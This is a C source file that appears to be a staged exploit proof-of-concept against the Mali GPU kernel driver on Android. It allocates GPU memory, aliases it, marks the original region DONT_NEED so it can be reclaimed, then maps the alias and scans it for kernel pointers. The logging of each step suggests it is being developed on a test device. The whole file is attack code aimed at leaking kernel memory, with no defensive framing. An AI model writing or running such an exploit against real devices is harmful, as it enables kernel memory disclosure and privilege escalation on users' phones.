#include <stdio.h>
#include <stdarg.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define PAGE_SHIFT 12
#define ALLOC_SIZE (64UL << 20)

typedef uint32_t base_context_create_flags;
typedef uint32_t base_mem_alloc_flags;

struct kbase_ioctl_version_check { uint16_t major; uint16_t minor; };
struct kbase_ioctl_set_flags { uint32_t create_flags; };
union kbase_ioctl_mem_alloc {
    struct { uint64_t va_pages; uint64_t commit_pages; uint64_t extent; uint64_t flags; } in;
    struct { uint64_t flags; uint64_t gpu_va; } out;
};
union kbase_ioctl_mem_alias {
    struct { uint64_t flags; uint64_t stride; uint64_t nents; uint64_t aliasing_info; } in;
    struct { uint64_t flags; uint64_t gpu_va; uint64_t va_pages; } out;
};
struct base_mem_handle { struct { uint64_t handle; } basep; };
struct base_mem_aliasing_info { struct base_mem_handle handle; uint64_t offset; uint64_t length; };
struct kbase_ioctl_mem_flags_change { uint64_t gpu_va; uint64_t flags; uint64_t mask; };

#define BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED ((base_context_create_flags)1 << 1)
#define BASEP_CONTEXT_MMU_GROUP_ID_SHIFT (3)
#define BASEP_CONTEXT_MMU_GROUP_ID_MASK ((base_context_create_flags)0xF << BASEP_CONTEXT_MMU_GROUP_ID_SHIFT)
#define BASEP_CONTEXT_CREATE_KERNEL_FLAGS (BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED | BASEP_CONTEXT_MMU_GROUP_ID_MASK)

#define BASE_MEM_MAP_TRACKING_HANDLE (3ull << 12)
#define BASE_MEM_PROT_GPU_RD ((base_mem_alloc_flags)1 << 2)
#define BASE_MEM_PROT_GPU_WR ((base_mem_alloc_flags)1 << 3)
#define BASE_MEM_PROT_CPU_RD ((base_mem_alloc_flags)1 << 0)
#define BASE_MEM_PROT_CPU_WR ((base_mem_alloc_flags)1 << 1)
#define BASE_MEM_SAME_VA ((base_mem_alloc_flags)1 << 13)
#define BASE_MEM_DONT_NEED ((base_mem_alloc_flags)1 << 17)
#define BASE_MEM_COHERENT_SYSTEM ((base_mem_alloc_flags)1 << 10)
#define BASE_MEM_COHERENT_LOCAL ((base_mem_alloc_flags)1 << 11)
#define BASE_MEM_FLAGS_MODIFIABLE (BASE_MEM_DONT_NEED | BASE_MEM_COHERENT_SYSTEM | BASE_MEM_COHERENT_LOCAL)

#define KBASE_IOCTL_TYPE 0x80
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_ALIAS _IOWR(KBASE_IOCTL_TYPE, 21, union kbase_ioctl_mem_alias)
#define KBASE_IOCTL_MEM_FLAGS_CHANGE _IOW(KBASE_IOCTL_TYPE, 23, struct kbase_ioctl_mem_flags_change)

static int logfd = -1;

static void logmsg(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) {
        write(1, buf, n);
        if (logfd >= 0) { write(logfd, buf, n); fsync(logfd); }
    }
}

static void step(const char *what, int rc) {
    if (rc < 0) logmsg("[-] %s FAILED errno=%d (%s)\n", what, errno, strerror(errno));
    else logmsg("[+] %s ok\n", what);
}

int main(int argc, char **argv) {
    int maxstep = (argc > 1) ? atoi(argv[1]) : 7;
    char path[128];
    snprintf(path, sizeof(path), "/data/local/tmp/mali_stage_%d.log", maxstep);
    logfd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
    logmsg("[*] mali_stage maxstep=%d alloc=%luMB pid=%d\n", maxstep, ALLOC_SIZE >> 20, getpid());
    logmsg("[*] walltime=%ld\n", (long)time(NULL));

    int fd = open("/dev/mali0", O_RDWR);
    step("open /dev/mali0", fd);
    if (fd < 0) { logmsg("[!] end\n"); return 1; }
    if (maxstep < 1) goto out;

    struct kbase_ioctl_version_check ver = { .major = 999, .minor = 999 };
    int rc = ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &ver);
    step("VERSION_CHECK", rc);
    if (rc < 0) goto out;
    logmsg("[i] kbase api %u.%u\n", ver.major, ver.minor);

    struct kbase_ioctl_set_flags sf = { .create_flags = BASEP_CONTEXT_CREATE_KERNEL_FLAGS };
    rc = ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf);
    step("SET_FLAGS", rc);
    if (rc < 0) goto out;
    if (maxstep < 2) goto out;
    sleep(2);

    void *track = mmap(NULL, ALLOC_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
    step("mmap tracking", track == MAP_FAILED ? -1 : 0);
    if (track == MAP_FAILED) goto out;
    logmsg("[i] tracking=%p\n", track);
    if (maxstep < 3) goto out;
    sleep(2);

    union kbase_ioctl_mem_alloc ma;
    memset(&ma, 0, sizeof(ma));
    ma.in.va_pages = ALLOC_SIZE >> PAGE_SHIFT;
    ma.in.commit_pages = ALLOC_SIZE >> PAGE_SHIFT;
    ma.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
    rc = ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma);
    step("MEM_ALLOC", rc);
    if (rc < 0) goto out;
    logmsg("[i] out.gpu_va=0x%llx flags=0x%llx\n", (unsigned long long)ma.out.gpu_va, (unsigned long long)ma.out.flags);

    void *gpu_va = mmap(NULL, ALLOC_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ma.out.gpu_va);
    step("mmap gpu_va", gpu_va == MAP_FAILED ? -1 : 0);
    if (gpu_va == MAP_FAILED) goto out;
    logmsg("[i] gpu_va=%p\n", gpu_va);
    if (maxstep < 4) goto out;
    sleep(2);

    union kbase_ioctl_mem_alias alias;
    memset(&alias, 0, sizeof(alias));
    alias.in.nents = 1;
    alias.in.stride = ALLOC_SIZE >> PAGE_SHIFT;
    alias.in.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR | BASE_MEM_PROT_CPU_RD;
    struct base_mem_aliasing_info ai;
    memset(&ai, 0, sizeof(ai));
    ai.handle.basep.handle = (uint64_t)gpu_va;
    ai.offset = 0;
    ai.length = ALLOC_SIZE >> PAGE_SHIFT;
    alias.in.aliasing_info = (uint64_t)&ai;
    rc = ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &alias);
    step("MEM_ALIAS", rc);
    if (rc < 0) goto out;
    logmsg("[i] alias out.gpu_va=0x%llx pages=%llu flags=0x%llx\n",
           (unsigned long long)alias.out.gpu_va, (unsigned long long)alias.out.va_pages,
           (unsigned long long)alias.out.flags);
    if (maxstep < 5) goto out;
    sleep(2);

    struct kbase_ioctl_mem_flags_change fc;
    fc.gpu_va = (uint64_t)gpu_va;
    fc.mask = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    fc.flags = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    rc = ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc);
    step("MEM_FLAGS_CHANGE DONT_NEED", rc);
    if (rc < 0) goto out;
    if (maxstep < 6) goto out;
    sleep(2);

    void *alias_va = mmap(NULL, ALLOC_SIZE, PROT_READ, MAP_SHARED, fd, alias.out.gpu_va);
    step("mmap alias_va", alias_va == MAP_FAILED ? -1 : 0);
    if (alias_va == MAP_FAILED) goto out;
    logmsg("[i] alias_va=%p\n", alias_va);

    uint64_t sample = *(volatile uint64_t *)alias_va;
    logmsg("[i] first qword: 0x%016llx\n", (unsigned long long)sample);
    if (maxstep < 7) goto out;
    sleep(2);

    unsigned long found = 0, i;
    for (i = 0; i < ALLOC_SIZE / 8; i++) {
        uint64_t v = *(volatile uint64_t *)((char *)alias_va + i * 8);
        if ((v & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
            if (found < 10) logmsg("[i] kptr @0x%lx: 0x%016llx\n", i * 8, (unsigned long long)v);
            found++;
        }
    }
    logmsg("[%c] kernel-looking qwords: %lu\n", found ? '+' : '-', found);

out:
    logmsg("[*] steps done, exiting (closing fd)\n");
    if (fd >= 0) close(fd);
    sleep(3);
    logmsg("[*] exit complete\n");
    return 0;
}
